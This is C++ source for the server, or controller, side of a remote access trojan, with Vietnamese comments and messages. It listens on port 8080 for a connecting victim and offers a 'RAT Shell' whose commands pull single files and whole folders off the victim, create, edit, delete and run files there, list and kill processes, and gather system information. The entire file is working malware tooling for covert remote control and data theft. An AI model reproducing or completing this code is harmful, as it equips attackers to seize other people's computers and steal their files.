#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <string>
#include <windows.h>
#include <io.h>
#include <vector>
#include <cstdint>
#include <filesystem>

namespace fs = std::filesystem;

#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 4096;


class SocketClient {
public:
    int socket;
    void stringSend(std::string msg);
    std::string stringReceive();
    void fileDownload(std::ofstream &file);
};

void SocketClient::stringSend(std::string msg) {
    if (msg.size() > UINT32_MAX) {
        throw std::runtime_error("Payload too large");
    }
    uint32_t payloadSize = static_cast<uint32_t>(msg.size());
    std::string packet(sizeof(payloadSize) + msg.size(), '\0');
    memcpy(packet.data(), &payloadSize, sizeof(payloadSize));
    memcpy(packet.data() + sizeof(payloadSize), msg.data(), msg.size());

    send(socket, packet.data(), packet.size(), 0);
}

std::string SocketClient::stringReceive() {
    uint32_t payloadSize = 0;

    int ret = recv(socket,
                   reinterpret_cast<char*>(&payloadSize),
                   sizeof(payloadSize),
                   0);

    if (ret <= 0) {
        return {};
    }

    std::string payload(payloadSize, '\0');

    int totalReceived = 0;
    while (totalReceived < payloadSize) {
        int bytes = recv(socket,
                         reinterpret_cast<char*>(payload.data()) + totalReceived,
                         payloadSize - totalReceived,
                         0);

        if (bytes <= 0) {
            return {};
        }

        totalReceived += bytes;
    }

    return payload;
}

void SocketClient::fileDownload(std::ofstream& file) {
    uint32_t payloadSize = 0;

    int ret = recv(socket,
                   reinterpret_cast<char*>(&payloadSize),
                   sizeof(payloadSize),
                   0);

    if (ret <= 0) {
        return;
    }

    char buffer[BUFFER_SIZE];

    int totalReceived = 0;
    while (totalReceived < payloadSize) {
        int toRead = (payloadSize - totalReceived < BUFFER_SIZE) ? payloadSize - totalReceived : BUFFER_SIZE;
        int bytes = recv(socket,
                         buffer,
                         toRead,
                         0);
        
        if (bytes > 0) {
            file.write(buffer, bytes);
            totalReceived += bytes;
        }
        else {
            break;
        }

    }
}



class DownloadManager
{
public:
    SocketClient client;
    void ReceiveFile(const std::string& filename);
    void ReceiveFolder(const std::string& foldername);  
};

void DownloadManager::ReceiveFile(const std::string& filename) {
    auto response = client.stringReceive();
    
    if (response.rfind("ERROR", 0) == 0) {
        std::cout << "[-] Client bao loi: " << response << std::endl;
        return;
    }

    // Tạo thư mục downloads lưu trữ tập trung
    std::string targetDir = "downloads";

    // Chỉ bỏ dấu ':' nếu client gửi kiểu C:\...
    std::string relativePath = filename;

    if (relativePath.size() > 1 && relativePath[1] == ':')
        relativePath.erase(1, 1);   // C:\abc -> C\abc

    fs::path filepath = fs::path(targetDir) / relativePath;

    // Tạo toàn bộ thư mục cha
    fs::create_directories(filepath.parent_path());

    std::ofstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        std::cout << "[-] Khong the tao file de ghi (Duong dan: " << filepath.make_preferred().string() << ")\n";
        return;
    }

    std::cout << "[*] Dang tai file va luu thanh: " << filepath.make_preferred().string() << "...\n";
    
    client.fileDownload(file);

    file.close();
    std::cout << "[+] Tai file thanh cong! Luu tai: " << filepath.make_preferred().string() << std::endl;
}

void DownloadManager::ReceiveFolder(const std::string& foldername) {
    std::cout << "[*] Dang doi phan hoi tu Client..." << std::endl;
    auto response = client.stringReceive();

    if (response.rfind("ERROR", 0) == 0) {
        std::cout << "[-] Client bao loi: " << response << std::endl;
        return;
    }

    // Nếu nhận được tín hiệu START, tiến hành tải file
    if (response.rfind("START", 0) == 0) {
        std::string targetDir = "downloads";
        CreateDirectoryA(targetDir.c_str(), NULL);

        std::string archivePath = targetDir + "\\" + "temp_archive.tar.gz";

        std::ofstream file(archivePath, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "[-] Khong the tao file ghi tren Server.\n";
            return;
        }

        std::cout << "[*] Dang tai tap tin nen cua folder (Timeout bat dau)...\n";
        
        client.fileDownload(file);

        file.close();

        std::cout << "[+] Da nhan tron ven file .tar.gz. Dang tien hanh giai nen...\n";

        // Chạy lệnh giải nén tar trên Windows (Windows 10/11 tích hợp sẵn tar trong system32)
        std::string untarCmd = "tar -xzf \"" + archivePath + "\" -C \"" + targetDir + "\"";
        int res = system(untarCmd.c_str());

        // Xóa file nén tạm thời để dọn dẹp bộ nhớ
        DeleteFileA(archivePath.c_str());

        if (res == 0) {
            std::cout << "[+] Tai va giai nen folder thanh cong! Kiem tra thu muc: .\\" << targetDir << "\\" << foldername << std::endl;
        } else {
            std::cout << "[-] Loi giai nen. Ma loi he thong: " << res << "\n";
        }
    } else {
        std::cout << "[-] Khong nhan duoc tin hieu hop le tu client. Noi dung nhan: " << response << std::endl;
    }
}



class RatServer {
public:
    void Start();

    ~RatServer()
    {
        if(clientSocket != INVALID_SOCKET)
            closesocket(clientSocket);

        if(serverSocket != INVALID_SOCKET)
            closesocket(serverSocket);

        WSACleanup();
    }

private:
    SocketClient client;
    DownloadManager downloadManager;
    SOCKET serverSocket{};
    SOCKET clientSocket{};

    void InitWinsock();
    void WaitForClient();
    void CommandLoop();

    void HandleCommand(const std::string& input);
    
    void ListFile();
    void SendFileContent(std::string& filename);

    void ListProcess();
    void ReceiveStatus();

    void SysInfo();
};

void RatServer::Start() {
    InitWinsock();
    WaitForClient();
    CommandLoop();
}

void RatServer::InitWinsock() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);

    std::cout << "[*] Server dang lang nghe tai cong 8080...\n";
}

void RatServer::WaitForClient() {
    client.socket = accept(serverSocket, nullptr, nullptr);
    downloadManager.client = client;
    std::cout << "[+] Co Client ket noi vao!\n";
}

void RatServer::CommandLoop() {
    std::string input;

    while (true) {
        std::cout << "\n[RAT Shell]> ";
        std::getline(std::cin, input);
        if (input.empty()) continue;
        if (input == "EXIT") break;
        
        // Gửi lệnh sang Client
        client.stringSend(input);

        HandleCommand(input);

    }
}

void RatServer::HandleCommand(const std::string& input) {
    char buffer[BUFFER_SIZE];

    if (input == "LIST") {
        ListFile();
    } 
    else if (input.rfind("GETFILE ", 0) == 0) {
        std::string filename = input.substr(8);
        downloadManager.ReceiveFile(filename); // Hàm nhận file lẻ cũ của bạn
    }
    else if (input.rfind("GETDIR ", 0) == 0) {
        std::string foldername = input.substr(7);
        downloadManager.ReceiveFolder(foldername); // Hàm nhận folder mới
    }
    else if (input.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý CREATEFILE
        std::string filename = input.substr(9);
        SendFileContent(filename);
    }
    else if (input.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý EDITFILE
        std::string filename = input.substr(9);
        SendFileContent(filename);
    }
    else if (input.rfind("REMOVEFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh REMOVEFILE
        ReceiveStatus();
    }
    else if (input.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh RUNFILE
        ReceiveStatus();
    }


    else if (input == "PS") { // Xử lý nhận danh sách tiến trình
        ListProcess();
    }
    else if (input.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh KILL
        ReceiveStatus();
    }
    
    
    else if (input == "SYSINFO") { // Thêm nhánh xử lý phản hồi lệnh SYSINFO
        SysInfo();
    }
}

void RatServer::ListFile() {
    auto response = client.stringReceive();

    if(response.empty())
        return;

    std::cout << "\n--- Danh sach file cua Client ---\n";
    std::cout << response << std::endl;
}

void RatServer::SendFileContent(std::string& filename) {
    auto clientSignal = client.stringReceive();

    if(clientSignal.empty())
        return;

    if (clientSignal == "READY_FOR_CONTENT") {
        // Yêu cầu người dùng nhập nội dung mới trên Server
        std::cout << "[*] Nhap noi dung moi cho file (An Enter de gui): ";
        std::string newContent;
        std::getline(std::cin, newContent);

        // Gửi nội dung mới sang Client
        client.stringSend(newContent);

        // Nhận kết quả phản hồi cuối cùng từ Client
        auto response = client.stringReceive();

        if(response.empty())
            return;
        
        std::cout << "[*] Ket qua tu Client: " << response;
    } else {
        std::cout << "[-] Client khong san sang. Phan hoi: " << clientSignal << std::endl;
    }
}

void RatServer::ReceiveStatus() {
    auto response = client.stringReceive();

    if(response.empty())
        std::cout << "[-] Khong nhan duoc phan hoi tu Client.\n";
    else {
        std::cout << "[*] Ket qua tu Client: " << response;
    }
}


void RatServer::ListProcess() {
    std::cout << "[*] Dang tai danh sach tien trinh..." << std::endl;

    std::string psResult = client.stringReceive();
    
    if (!psResult.empty()) {
        std::cout << psResult << std::endl;
    } else {
        std::cout << "[-] Khong nhan duoc du lieu hoac thoi gian cho qua lau.\n";
    }
}


void RatServer::SysInfo() {
    std::cout << "[*] Dang tai thong tin cau hinh tu Client..." << std::endl;

    std::string sysInfoResult = client.stringReceive();
    if (!sysInfoResult.empty()) {
        std::cout << sysInfoResult << std::endl;
    } else {
        std::cout << "[-] Khong nhan duoc du lieu phan hoi.\n";
    }
}



int main() {
    RatServer server;
    server.Start();
}